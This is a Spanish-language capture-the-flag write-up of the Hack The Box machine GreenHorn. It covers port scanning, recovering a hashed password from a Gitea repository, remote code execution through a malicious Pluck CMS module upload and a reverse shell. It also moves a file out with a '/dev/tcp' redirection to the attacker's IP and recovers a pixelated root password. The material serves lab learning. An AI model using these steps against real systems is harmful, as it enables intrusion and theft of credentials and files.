Inicamos el escaneo con [[Anotaciones/Herramientas/Nmap|Nmap]] sobre todos lo puertos
![[Pasted image 20241120161937.png]]
```bash
sudo nmap 10.10.11.25 -p- -sS -n -Pn -v -open --min-rate 5000 -oG allPorts
```



Ahora sobre los puertos encontrados vamos a iniciar un scaneo de las versiones asi como hacer uso de los script mas usados para esos puertos
```bash
sudo nmap -p22,80,3000 -sCV -n -Pn --min-rate 5000 -open 10.10.11.25 -oN Targeted
```

![[Pasted image 20241120162439.png]]
![[Pasted image 20241120162646.png]]
![[Pasted image 20241120162532.png]]

una vez tenemos hecha la enumeracion de puertos asi como un poco los servicios, vamos a mirar el servicio web que esta corriendo por el puerto 80 (debemos meterlo en el `/etc/host` )
![[Pasted image 20241120162738.png]]
algo que me llama la atencion es la palabra `admin` que hay abajo a la derecha, tambien vemos la tecnologia que esta usando por detras `pluck` (es un cms de codigo abierto), vamos a listar todas la informacion util para una explotacion
- Parametro `file`
	![[Pasted image 20241120163134.png]]\
		no parece hacer nada con texto normal
		![[Pasted image 20241120163227.png]]
		pero cuando le metes `\` peta
		![[Pasted image 20241120163303.png]]
		interesante
	
- pagina de inicio de session y version de `pluck` usada
	![[Pasted image 20241120163411.png]]
		y es vulnerable
		![[Pasted image 20241120163516.png]]
	

respecto a la otra web `http://10.10.11.25:3000/`, parece que tenemos un servicio de git que usa `gitea` en su version `1.21.11`
![[Pasted image 20241120164323.png]]

en este servicio podemos ver:
- usuarios:
	![[Pasted image 20241120164423.png]]
	`Flo`,`GreenAdmin`
- un repositorio que parece ser un repo del servicio que esta corriendo por el puerto 80, algunos archivos interesantes pueden ser:
	- el `.htaccess` ya que tiene definidos parametros para evitar la ejecucion de archivos `php` (pero concretamente en esa carpeta)
		![[Pasted image 20241120165334.png]]
	-  analizando los archivos he encontrado lo que parece ser una password en `sha512` 
		![[Pasted image 20241120171425.png]]
		![[Pasted image 20241120172230.png]]
	
Vamos a usar la clave que hemos encontrado para iniciar session en el panel de admin del servidor
![[Pasted image 20241120173240.png]]
> [!info]- Cabe destacar que tal y como pone en los archivo, para identificar si el usuario esta logiado usa esta cadena y cuyo valor es 'pluck_loggedin' esto ya lo vimos en los archivos
> ![[Pasted image 20241120173439.png]]
> Donde `$token` es:
> ![[Pasted image 20241120173504.png]]

en el cms nosotros podemos crear una pagina web, el problema es que ya nos lo estaba advirtiendo el `.htaccess` y es que los `.php` nos los va a mostrar como texto plano en los directorios ("files","images")
![[Pasted image 20241120174345.png]]
> [!info] lo mas probables es que el parámetros `file` busque dentro de la carpeta file (que tiene el .htaccess)

el `.htaccess` decia que no se interpretaria el codigo php de ningun tipo (`php_flag engine off`) pero como estamos escribiendo en la misma carpeta donde esta el `.htaccess` puede que lo podamos sobre escribir, pero no funciona, despues de estar investigando resulta que esta version de `pluck` tiene un parametro en el archivo `install.php` (concretamente `install.php?contents=`) que es vulnerable a stored xss, pero con eso no podemos hacer nada en este caso, si seguimos investigando vemos que hay un RCE a la hora de instalar un modulo
![[Pasted image 20241120184007.png]]
al parecer solo necesitamos comprimir un archivo `.php` y este luego se va a descomprimir en otro directorio que no contiene el `.htaccess` de esta forma poder ejecutar codigo php
![[Pasted image 20241120184511.png]]
ahora comprimimos el archivo
```bash
zip modulo.zip cmd.php
```
vamos a subirlo y nos vamso a la ruta donde se instalan los modulos en este cms `data/modules/<nombremodulo>/<archivo>`
![[Pasted image 20241120184654.png]]
Genial!!!
![[Pasted image 20241120184841.png]]
vamos a crearnos una revershell y vamos a proceder con la enumeración para escalar privilegios, al parecer la password que hemos encontrado antes para entrar en el cms, tambien vale para cambiarnos de `www-data` a `junior`


![[Pasted image 20241120191052.png]]
Dentro de la carpeta de usuario vemos un archivo pdf
![[Pasted image 20241120192726.png]]
Vamos a pasarnos el archivo y verlo
- emisor
```bash
cat Using\ OpenVAS.pdf > /dev/tcp/10.10.14.118/4443
```
- receptor
```bash
nc -lnvp 4443 > miPDF.pdf
```
![[Pasted image 20241120193059.png]]

revisando el pdf vemos que hay una contraseña de lo que parecer ser root que esta com difuminada..., esto se puede solucionar, vamos a extraer la imagen del pdf (https://tools.pdf24.org/en/extract-images) vamos a descomprimir el archivo con `unzip <archivo>` y ahora le pasamos [[depix]]
```bash
python3 depix.py -p ~/Desktop/jr117/HTB/GreenHorn/content/0.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
```
![[Pasted image 20241120195218.png]]
Ahora tenemos esto `sidefromsidetheothersidesidefromsidetheotherside` y ya somos root
![[Pasted image 20241120195745.png]]

a